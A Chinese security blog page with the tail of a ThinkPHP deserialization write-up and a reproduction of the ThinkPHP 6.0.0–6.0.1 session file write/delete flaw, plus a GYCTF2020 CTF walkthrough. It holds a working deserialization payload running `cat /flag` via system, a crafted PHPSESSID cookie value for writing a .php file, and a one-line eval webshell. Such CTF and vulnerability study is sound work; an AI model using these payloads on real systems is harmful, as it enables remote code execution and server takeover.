<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c9c7cb46-f78b-4359-a3b6-7cfc292d6693.node3.buuoj.cn&#x2F;&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/Ua4b2ba8f1083450a97da5f44101cc09d5.jpg"></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12203047.html">https://www.cnblogs.com/20175211lyz/p/12203047.html</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1160">https://forum.90sec.com/t/topic/1160</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-10T06:17:32.000Z" title="2021-04-10T06:17:32.000Z">2021-04-10</time>发表</span><span class="level-item"><time dateTime="2021-04-10T06:49:57.100Z" title="2021-04-10T06:49:57.100Z">2021-04-10</time>更新</span><span class="level-item">6 分钟读完 (大约889个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>thinkphp6默认是没有开启session功能的,需要取消app\middleware.php文件中对session的注释</p>
<p><img src="https://i.loli.net/2021/04/10/OPnASFNwt2DaoKf.png" alt="image-20210410120046743.png"></p>
<p>由于默认情况下没有创建session，所需要修改一下控制器，加上创建session的功能。</p>
<p><img src="https://www.hualigs.cn/image/607146a875416.jpg"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>修改cookie为<code>PHPSESSID=aaaabbbbccccddddeeeeffff1234.php</code>，文件名长度必须等于32位</p>
<p><img src="https://i.loli.net/2021/04/10/rAE1VqHf87vWnNK.png" alt="image-20210410121629403.png"></p>
<p>写入成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp6.0.0&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607146af4dd4b.jpg"></p>
<p>写入文件内容</p>
<p><img src="https://www.hualigs.cn/image/607146a5efef4.jpg"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>vendor/topthink/framework/src/think/session/Store.php</p>
<p>调用了<code>write()</code>方法，<code>$sessionId</code>等于<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a87f1fe.jpg"></p>
<p>vendor/topthink/framework/src/think/session/driver/File.php</p>
<p>跟进<code>write()</code>方法，写入文件名为经过<code>getFileName()</code>处理的<code>$sessID</code>，写入文件内容为传入的参数<code>$sessData</code></p>
<p><img src="https://www.hualigs.cn/image/607146a28d9ef.jpg"></p>
<p>跟进<code>getFileName()</code>，文件名实质上就等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p>
<p><code>writeFile()</code>方法调用了file_put_contents()写入文件，写入的文件名等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a31e76e.jpg"></p>
<p>接着查找<code>$this-&gt;id</code>的来源，当传入的参数$id长度等于32位时返回<code>$this-&gt;id</code>等于<code>$id</code>。</p>
<p><img src="https://www.hualigs.cn/image/607146a41f03a.jpg"></p>
<p>vendor/topthink/framework/src/think/middleware/SessionInit.php</p>
<p>这里调用了<code>setId()</code>方法，$cookName等于PHPSESID， <code>$this-&gt;$id</code> 最终来源于cookie中的 <code>PHPSESSID</code> 。这样写入的文件名就可控了。文件内容<code>data</code>来源于session的内容，需要代码中存在可以控制session内容的操作，如<code>Session::set(&#39;name&#39;,$_POST[&#39;c&#39;]);</code>，就可以写入shell。</p>
<p><img src="https://www.hualigs.cn/image/607146aba283e.jpg"></p>
<p>vendor/topthink/framework/src/think/session/Store.php</p>
<p><img src="https://www.hualigs.cn/image/607146a4916e6.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a4ef622.jpg"></p>
<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>vendor/topthink/framework/src/think/session/Store.php</p>
<p>要触发<code>delete()</code>方法必须要使<code>$this-&gt;data</code>为空，即session中的变量键值为空</p>
<p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p>
<p>vendor/topthink/framework/src/think/session/driver/File.php</p>
<p>delete()方法中的文件名拼接上了sess_，文件名不完全可控，在windows下才可以用一个不存在的目录绕过限制删除任意文件。</p>
<p><img src="https://www.hualigs.cn/image/607146a9d0e64.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p>
<h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h1><p>通过错误信息得到thinkphp版本为6.0.0</p>
<p><img src="https://www.hualigs.cn/image/607146a9c41b3.jpg"></p>
<p>存在<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://www.hualigs.cn/image/607146a90a25a.jpg"></p>
<p>\app\middleware.php</p>
<p>session开启</p>
<p><img src="https://www.hualigs.cn/image/60714743b1aaa.jpg"></p>
<p>\app\home\controller\Member.php</p>
<p>在search控制器下出现了创建session操作，session键值key通过post传参，内容可控</p>
<p><img src="https://www.hualigs.cn/image/607146af6b105.jpg"></p>
<p>注册一个用户</p>
<p><img src="https://www.hualigs.cn/image/607146ae5a420.jpg"></p>
<p>登陆，修改修改PHPSESSID为aaaabbbbccccddddeeeeffff1234.php</p>
<p><img src="https://www.hualigs.cn/image/607146ad52377.jpg"></p>
<p>写入shell，key=<code>&lt;?php eval($_POST[1]);?&gt;</code></p>
<p><img src="https://www.hualigs.cn/image/607146a99aef8.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146b00fce8.jpg"></p>
<p>成功写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;70366b0f-3c41-4ddb-8e92-2f4fae6b1b2e.node3.buuoj.cn&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607146b09f419.jpg"></p>
<p>蚁剑连接后发现flag为空，根目录存在readflag文件，需要执行readflag</p>
<p><img src="https://www.hualigs.cn/image/607146b004f5f.jpg"></p>
<p>发现disable_function过滤命令执行函数</p>
<p><img src="https://www.hualigs.cn/image/607146ace2ccf.jpg"></p>
<p>使用蚁剑绕过disable_function插件读取flag</p>
<p><img src="https://www.hualigs.cn/image/607149d41c4f8.jpg"></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="http://hed9eh0g.top/?p=280">http://hed9eh0g.top/?p=280</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/">https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8546">https://xz.aliyun.com/t/8546</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">37</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-24T03:01:50.000Z">2021-04-24</time></p><p class="title"><a href="/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">jdk7u21反序列化</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-22T23:44:21.000Z">2021-04-23</time></p><p class="title"><a href="/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/">羊城杯2020复现</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-20T08:34:24.000Z">2021-04-20</time></p><p class="title"><a href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ThinkPhp3.2.3注入漏洞总结</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-19T13:41:01.000Z">2021-04-19</time></p><p class="title"><a href="/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">php原生类利用</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-17T05:24:56.000Z">2021-04-17</time></p><p class="title"><a href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/">JNDI注入</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>